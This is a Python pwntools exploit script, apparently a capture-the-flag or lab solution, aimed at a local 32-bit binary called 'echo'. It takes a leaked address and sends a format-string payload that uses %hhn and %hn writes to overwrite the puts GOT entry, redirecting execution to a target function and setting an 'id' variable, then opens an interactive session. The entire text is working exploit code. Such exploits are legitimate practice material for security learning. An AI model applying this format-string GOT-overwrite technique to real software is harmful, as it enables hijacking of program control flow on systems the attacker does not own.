from pwn import *
context.arch = 'i386'
# context.log_level = 'debug' 
sh = process("./echo", env={"LD_LIBRARY_PATH":"."})

sh.recvuntil("Remeber that &id = ")
id_addr = int(sh.recvuntil("\n"),16)
sh.recvuntil("You can exactly 256 charecters ...\n")

elf=ELF('./echo')
puts_got=elf.got['puts']
target_addr = elf.plt["target_function_3180105507"]
# id = 0xbd8c8f23
id_1 = 0xbd8c
id_2 = 0x8f23

# target_addr=0x8049190
payload = "%8c%22$hhn"+"%136c%23$hhn"+"%1025c%24$hn%"+str(id_2-1169)+"c%25$hn%"+str(id_1-id_2)+"c%26$hn"+(p32(puts_got+3)+p32(puts_got)+p32(puts_got+1)+p32(id_addr)+p32(id_addr+2)).decode("iso-8859-1")

sh.sendline(payload)
print(sh.recv())
sh.interactive()